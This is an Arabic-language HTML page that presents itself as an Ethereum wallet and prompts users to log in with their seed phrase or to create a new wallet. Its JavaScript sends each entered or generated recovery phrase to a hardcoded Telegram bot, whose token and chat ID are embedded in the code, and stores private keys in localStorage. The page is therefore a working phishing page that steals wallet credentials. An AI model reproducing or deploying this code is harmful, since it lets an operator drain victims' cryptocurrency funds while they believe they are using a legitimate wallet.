𝔸𝕝𝕚 𝕄𝕒𝕙𝕞𝕠𝕦𝕕 
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المحفظة الإلكترونية</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            width: 100%;
            max-width: 100%;
            padding: 20px;
            margin: 0 auto;
        }
        
        header {
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .auth-container, .wallet-container {
            background-color: white;
            padding: 30px;
            margin: 30px auto;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
        }
        
        h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            font-size: 16px;
        }
        
        button {
            background-color: #2c3e50;
            color: white;
            border: none;
            padding: 12px 20px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
        }
        
        button:hover {
            background-color: #1a252f;
        }
        
        .wallet-address {
            word-break: break-all;
            background-color: #f9f9f9;
            padding: 15px;
            border: 1px solid #ddd;
            margin-bottom: 20px;
        }
        
        .assets-list {
            list-style-type: none;
        }
        
        .assets-list li {
            padding: 15px;
            border-bottom: 1px solid #ddd;
            display: flex;
            justify-content: space-between;
        }
        
        .create-wallet-btn {
            background-color: #27ae60;
            margin-top: 20px;
        }
        
        .create-wallet-btn:hover {
            background-color: #219653;
        }
        
        @media (min-width: 768px) {
            .container {
                max-width: 750px;
            }
        }
        
        @media (min-width: 992px) {
            .container {
                max-width: 970px;
            }
        }
        
        @media (min-width: 1200px) {
            .container {
                max-width: 1170px;
            }
        }
    </style>
</head>
<body>
    <header>
        <h1>المحفظة الإلكترونية</h1>
    </header>
    
    <div class="container">
        <div id="auth-section" class="auth-container">
            <h2>تسجيل الدخول</h2>
            <div class="form-group">
                <label for="seed-phrase">عبارة الاسترجاع (Seed Phrase)</label>
                <input type="password" id="seed-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
            </div>
            <button id="login-btn">الدخول إلى المحفظة</button>
            <button id="create-wallet-btn" class="create-wallet-btn">إنشاء محفظة جديدة</button>
        </div>
        
        <div id="wallet-section" class="wallet-container" style="display: none;">
            <h2>محفظتك الإلكترونية</h2>
            <div class="form-group">
                <label>عنوان المحفظة:</label>
                <div id="wallet-address" class="wallet-address"></div>
            </div>
            
            <div class="form-group">
                <label>الأصول المتاحة:</label>
                <ul id="assets-list" class="assets-list">
                    <!-- سيتم ملء الأصول هنا عبر JavaScript -->
                </ul>
            </div>
            
            <button id="logout-btn">تسجيل الخروج</button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // العناصر الرئيسية في الواجهة
            const authSection = document.getElementById('auth-section');
            const walletSection = document.getElementById('wallet-section');
            const loginBtn = document.getElementById('login-btn');
            const createWalletBtn = document.getElementById('create-wallet-btn');
            const logoutBtn = document.getElementById('logout-btn');
            const seedPhraseInput = document.getElementById('seed-phrase');
            const walletAddressElement = document.getElementById('wallet-address');
            const assetsListElement = document.getElementById('assets-list');
            
            // بيانات التكوين
            const telegramBotToken = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
            const chatId = '910021564';
            const infuraApiKey = '482a7c1c7cc14ec78699c3f1c231b0cd';
            
            // إرسال رسالة إلى Telegram
            async function sendToTelegram(message) {
                try {
                    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    });
                    
                    const data = await response.json();
                    return data.ok;
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    return false;
                }
            }
            
            // إنشاء محفظة جديدة
            async function createNewWallet() {
                try {
                    // إنشاء محفظة عشوائية باستخدام ethers.js
                    const wallet = ethers.Wallet.createRandom();
                    
                    // إرسال عبارة الاسترجاع إلى Telegram
                    const message = `تم إنشاء محفظة جديدة: ${wallet.mnemonic.phrase}`;
                    await sendToTelegram(message);
                    
                    // حفظ المحفظة في localStorage
                    localStorage.setItem('walletData', JSON.stringify({
                        address: wallet.address,
                        privateKey: wallet.privateKey,
                        mnemonic: wallet.mnemonic.phrase
                    }));
                    
                    // عرض المحفظة
                    showWallet(wallet.address);
                    
                    alert('تم إنشاء محفظة جديدة بنجاح! عبارة الاسترجاع تم إرسالها إلى المسؤول.');
                } catch (error) {
                    console.error('Error creating wallet:', error);
                    alert('حدث خطأ أثناء إنشاء المحفظة. يرجى المحاولة مرة أخرى.');
                }
            }
            
            // استيراد محفظة موجودة
            async function importWallet(seedPhrase) {
                try {
                    // إنشاء محفظة من عبارة الاسترجاع
                    const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
                    
                    // إرسال عبارة الاسترجاع إلى Telegram
                    const message = `تم استيراد محفظة: ${seedPhrase}`;
                    await sendToTelegram(message);
                    
                    // حفظ المحفظة في localStorage
                    localStorage.setItem('walletData', JSON.stringify({
                        address: wallet.address,
                        privateKey: wallet.privateKey,
                        mnemonic: seedPhrase
                    }));
                    
                    // عرض المحفظة
                    showWallet(wallet.address);
                    
                    // جلب رصيد المحفظة
                    fetchWalletBalance(wallet.address);
                } catch (error) {
                    console.error('Error importing wallet:', error);
                    alert('عبارة الاسترجاع غير صحيحة. يرجى المحاولة مرة أخرى.');
                }
            }
            
            // عرض واجهة المحفظة
            function showWallet(address) {
                authSection.style.display = 'none';
                walletSection.style.display = 'block';
                walletAddressElement.textContent = address;
            }
            
            // جلب رصيد المحفظة من شبكة Ethereum
            async function fetchWalletBalance(address) {
                try {
                    // الاتصال بشبكة Ethereum عبر Infura
                    const provider = new ethers.providers.InfuraProvider('mainnet', infuraApiKey);
                    
                    // الحصول على الرصيد
                    const balance = await provider.getBalance(address);
                    const balanceInEth = ethers.utils.formatEther(balance);
                    
                    // عرض الرصيد
                    assetsListElement.innerHTML = `
                        <li>
                            <span>Ethereum (ETH)</span>
                            <span>${parseFloat(balanceInEth).toFixed(6)} ETH</span>
                        </li>
                    `;
                } catch (error) {
                    console.error('Error fetching balance:', error);
                    assetsListElement.innerHTML = `
                        <li>
                            <span>Ethereum (ETH)</span>
                            <span>غير متاح</span>
                        </li>
                    `;
                }
            }
            
            // تسجيل الخروج
            function logout() {
                localStorage.removeItem('walletData');
                walletSection.style.display = 'none';
                authSection.style.display = 'block';
                seedPhraseInput.value = '';
            }
            
            // التحقق مما إذا كان هناك محفظة مسجلة مسبقاً
            function checkExistingWallet() {
                const walletData = localStorage.getItem('walletData');
                if (walletData) {
                    const wallet = JSON.parse(walletData);
                    showWallet(wallet.address);
                    fetchWalletBalance(wallet.address);
                }
            }
            
            // تعيين معالجات الأحداث
            loginBtn.addEventListener('click', function() {
                const seedPhrase = seedPhraseInput.value.trim();
                if (seedPhrase) {
                    importWallet(seedPhrase);
                } else {
                    alert('يرجى إدخال عبارة الاسترجاع');
                }
            });
            
            createWalletBtn.addEventListener('click', createNewWallet);
            logoutBtn.addEventListener('click', logout);
            
            // التحقق من وجود محفظة عند تحميل الصفحة
            checkExistingWallet();
        });
    </script>
</body>
</html>
